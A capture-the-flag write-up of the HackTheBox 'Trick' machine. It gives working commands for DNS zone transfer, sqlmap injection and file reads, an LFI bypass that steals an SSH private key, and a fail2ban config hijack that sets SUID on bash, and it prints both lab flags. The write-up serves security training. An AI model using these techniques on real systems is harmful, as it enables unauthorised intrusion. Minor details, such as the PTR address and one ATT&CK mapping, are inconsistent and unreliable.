# HackTheBox — Trick

| Field | Details |
| --- | --- |
| Platform | HackTheBox |
| Challenge | Trick |
| Difficulty | Easy |
| OS | Linux (Debian 10 Buster) |
| IP | 10.129.227.180 |
| Date | October 2026 |
| User Flag | `919f0b217747f3cc092d8e0ce5186faa` |
| Root Flag | `33dc1bc9599f2951f805efc5dc76b040` |

---

## Challenge Summary

Trick is an Easy HackTheBox web challenge that chains DNS enumeration, SQL injection, local file inclusion, and a service-configuration privilege escalation. A reverse lookup identifies `trick.htb`, and an unrestricted DNS zone transfer exposes the payroll subdomain. SQL injection in its login form reveals a MySQL account with the `FILE` privilege, enabling file reads and discovery of a second, unlisted marketing vHost.

The marketing application contains an LFI filtered with a non-recursive `str_replace("../", "")`. The `....//` bypass reads Michael's SSH private key because its PHP-FPM pool runs as `michael`. After SSH access, the `security` group can replace a fail2ban action configuration while sudo permits a service restart. Triggering a ban executes the malicious `actionban` as root and sets SUID on bash.

**Skills demonstrated:**

- DNS reverse lookups and zone-transfer enumeration
- SQL injection validation and SQLmap technique selection
- MySQL `FILE` privilege abuse for arbitrary file reads
- Nginx virtual-host and PHP-FPM socket analysis
- LFI filter bypass using `....//`
- SSH access with an extracted OpenSSH private key
- Linux permissions analysis and fail2ban action hijacking

---

## Attack Chain Summary

```
Nmap TCP → SSH, SMTP, DNS, HTTP
dig -x → trick.htb
DNS AXFR → preprod-payroll.trick.htb
Payroll SQLi → MySQL FILE privilege
FILE read → Nginx config → preprod-marketing.trick.htb
Marketing LFI with ....// → /home/michael/.ssh/id_rsa
SSH as michael → user flag
security-group write access to fail2ban action.d
sudo fail2ban restart → malicious actionban
Trigger SSH ban → SUID /bin/bash → bash -p → root flag
```

---

## Step 1 — Nmap TCP Scan

A targeted scan of the discovered TCP ports identifies the main services:

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sS -sV -sC -T4 -O -p 22,25,53,80 -Pn -oA Trick 10.129.227.180
```

**Output:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
25/tcp open  smtp?
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
```

| Port | Service | Attack Relevance |
| --- | --- | --- |
| 22 | OpenSSH | Foothold after credentials or a key are recovered |
| 25 | SMTP | Potential mail-log poisoning surface |
| 53 | ISC BIND | DNS zone-transfer surface |
| 80 | nginx | Virtual-hosted web applications |

The web landing page provides little information, but a DNS service on the target is a strong signal to enumerate the domain.

---

## Step 2 — DNS Enumeration

Query the target DNS server for a PTR record:

```bash
Hackerpatel007_1@htb[/htb]$ dig @10.129.227.180 -x 10.129.227.180
```

**Output:**

```
;; ANSWER SECTION:
166.11.10.10.in-addr.arpa. 604800 IN PTR trick.htb.
```

Register the hostname:

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.227.180 trick.htb" | sudo tee -a /etc/hosts
```

Attempt a full zone transfer:

```bash
Hackerpatel007_1@htb[/htb]$ dig @10.129.227.180 axfr trick.htb
```

**Output:**

```
trick.htb.                    604800 IN NS    trick.htb.
preprod-payroll.trick.htb.    604800 IN CNAME trick.htb.
```

The AXFR request succeeds and exposes the pre-production payroll application.

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.227.180 preprod-payroll.trick.htb" | sudo tee -a /etc/hosts
```

---

## Step 3 — SQL Injection on Payroll

`preprod-payroll.trick.htb` hosts an Employee Payroll Management System login form. Test its `username` POST parameter with SQLmap:

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login \
  --data="username=abc&password=abc" -p username --batch
```

SQLmap confirms MySQL time-based blind SQL injection. To avoid slow time-based extraction, use Boolean and error-based techniques:

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login \
  --data="username=abc&password=abc" -p username \
  --level 5 --risk 3 --technique=BEUS --batch
```

**Result:**

```
Parameter: username (POST)
    Type: boolean-based blind
    Type: error-based
[INFO] the back-end DBMS is MySQL
```

The application credentials extracted from the database are not useful for SSH. The relevant discovery is the database account privilege:

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login \
  --data="username=abc&password=abc" -p username --privileges
```

```
[*] 'remo'@'localhost' [1]:
    privilege: FILE
```

MySQL's `FILE` privilege permits reading files accessible to the database process.

---

## Step 4 — Read Files Through MySQL FILE Privilege

First read `/etc/passwd`:

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login \
  --data="username=abc&password=abc" -p username --batch --file-read=/etc/passwd
```

**Relevant entry:**

```
michael:x:1001:1001::/home/michael:/bin/bash
```

Next read Nginx's enabled site configuration to identify unlisted vHosts:

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login \
  --data="username=abc&password=abc" -p username --batch \
  --file-read=/etc/nginx/sites-enabled/default
```

**Key configuration:**

```nginx
server_name preprod-marketing.trick.htb;
root /var/www/market;
fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
```

The configuration exposes a second vHost that was absent from DNS. Crucially, its PHP-FPM pool runs as `michael`, so an LFI in that application can read files owned by Michael.

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.227.180 preprod-marketing.trick.htb" | sudo tee -a /etc/hosts
```

---

## Step 5 — LFI Filter Bypass and SSH Key Extraction

The marketing site uses a file parameter:

```
http://preprod-marketing.trick.htb/index.php?page=services.html
```

The application filters `../` once, which is bypassed with `....//`:

```
....// → str_replace("../", "") → ../
```

Confirm LFI:

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd
```

Read Michael's private key:

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa
```

The response contains a complete OpenSSH private key. Save it locally and protect its permissions:

```bash
Hackerpatel007_1@htb[/htb]$ chmod 600 id_rsa
Hackerpatel007_1@htb[/htb]$ ssh -i id_rsa michael@10.129.227.180
```

**Shell:**

```
michael@trick:~$
```

Capture the user flag:

```bash
michael@trick:~$ cat user.txt
919f0b217747f3cc092d8e0ce5186faa
```

---

## Step 6 — Privilege Escalation Enumeration

Inspect group membership and sudo permissions:

```bash
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)

michael@trick:~$ sudo -l
(root) NOPASSWD: /etc/init.d/fail2ban restart
```

The `security` group owns fail2ban's action directory:

```bash
michael@trick:~$ ls -ld /etc/fail2ban/action.d
drwxrwx--- 2 root security 4096 Jun 13 19:06 /etc/fail2ban/action.d
```

Although individual files are root-owned, directory write permission lets members rename them and create replacements.

---

## Step 7 — fail2ban actionban Hijack

The default SSH ban action is `iptables-multiport.conf`. Move it and create a new user-owned copy:

```bash
michael@trick:/etc/fail2ban/action.d$ mv iptables-multiport.conf .old
michael@trick:/etc/fail2ban/action.d$ cp .old iptables-multiport.conf
```

Replace its `actionban` directive:

```
actionban = chmod u+s /bin/bash
```

Make the new config readable and restart fail2ban:

```bash
michael@trick:/etc/fail2ban/action.d$ chmod 666 iptables-multiport.conf
michael@trick:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart
```

From a separate terminal, make repeated failed SSH attempts until fail2ban bans the attack IP. The daemon runs the modified `actionban` as root.

Verify the resulting SUID bit and retain the effective UID with `bash -p`:

```bash
michael@trick:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18 2019 /bin/bash

michael@trick:~$ bash -p
bash-5.0# id
uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
```

---

## Step 8 — Root Flag

```bash
bash-5.0# cat /root/root.txt
33dc1bc9599f2951f805efc5dc76b040
```

| Flag | Value |
| --- | --- |
| User | `919f0b217747f3cc092d8e0ce5186faa` |
| Root | `33dc1bc9599f2951f805efc5dc76b040` |

---

## Lessons Learned

- **Run DNS checks whenever port 53 is exposed.** A successful AXFR request can reveal internal or staging vHosts that ordinary web enumeration will miss.
- **MySQL FILE is a high-impact privilege.** It provides filesystem reads and is particularly effective for recovering server configuration files, service credentials, and unlisted vHosts.
- **PHP-FPM socket ownership matters.** A named user pool changes the file-access context of PHP, substantially increasing the impact of LFI.
- **One-pass path sanitisation is insufficient.** `str_replace("../", "")` is bypassable with `....//`; robust path validation must resolve and restrict canonical paths.
- **Directory permissions protect names, not file contents.** Group write access to a directory can allow replacement of root-owned configuration files inside it.
- **Service restart rights need careful review.** Restarting a root-managed service becomes root code execution when its configuration is writable by the lower-privilege user.

---

## Full Attack Chain Reference

```
1. nmap -sS -sV -sC -T4 -O -p 22,25,53,80 -Pn -oA Trick 10.129.227.180
   → SSH, SMTP, BIND, nginx

2. dig @10.129.227.180 -x 10.129.227.180
   → trick.htb

3. dig @10.129.227.180 axfr trick.htb
   → preprod-payroll.trick.htb

4. SQLi in Payroll username parameter
   → MySQL FILE privilege for remo@localhost

5. sqlmap --file-read=/etc/nginx/sites-enabled/default
   → preprod-marketing.trick.htb, PHP-FPM as michael

6. LFI with ....// bypass
   → /home/michael/.ssh/id_rsa

7. ssh -i id_rsa michael@10.129.227.180
   → user flag

8. security group write access to /etc/fail2ban/action.d
   + NOPASSWD fail2ban restart

9. Replace iptables-multiport.conf actionban
   → chmod u+s /bin/bash

10. Trigger SSH ban → bash -p
    → root flag
```

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `dig @<IP> -x <IP>` | Discover the target domain from a PTR record |
| `dig @<IP> axfr trick.htb` | Attempt DNS zone transfer |
| `sqlmap -u <URL> --data="username=abc&password=abc" -p username --batch` | Confirm SQL injection |
| `sqlmap ... --level 5 --risk 3 --technique=BEUS --batch` | Prefer Boolean and error-based extraction |
| `sqlmap ... --privileges` | Identify MySQL FILE privilege |
| `sqlmap ... --file-read=/etc/nginx/sites-enabled/default` | Extract virtual-host configuration |
| `index.php?page=....//....//....//....//....//etc/passwd` | Bypass LFI path filter |
| `chmod 600 id_rsa && ssh -i id_rsa michael@<IP>` | SSH with extracted key |
| `sudo -l` | Enumerate permitted commands |
| `mv iptables-multiport.conf .old && cp .old iptables-multiport.conf` | Replace root-owned config through directory write access |
| `sudo /etc/init.d/fail2ban restart` | Load modified fail2ban action |
| `bash -p` | Preserve root effective UID from SUID bash |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Detail |
| --- | --- | --- |
| Reconnaissance | T1590.002 — DNS | PTR lookup and AXFR zone transfer |
| Initial Access | T1190 — Exploit Public-Facing Application | SQL injection and LFI in web applications |
| Credential Access | T1552.001 — Credentials in Files | SSH private key extracted through LFI |
| Lateral Movement | T1021.004 — Remote Services: SSH | SSH as Michael with recovered key |
| Privilege Escalation | T1548.003 — Sudo and Sudo Caching | NOPASSWD fail2ban restart |
| Privilege Escalation | T1574.006 — Dynamic Linker Hijacking | fail2ban action configuration replaced through writable directory |
| Privilege Escalation | T1548.001 — Setuid and Setgid | fail2ban set SUID on bash; `bash -p` retained euid 0 |
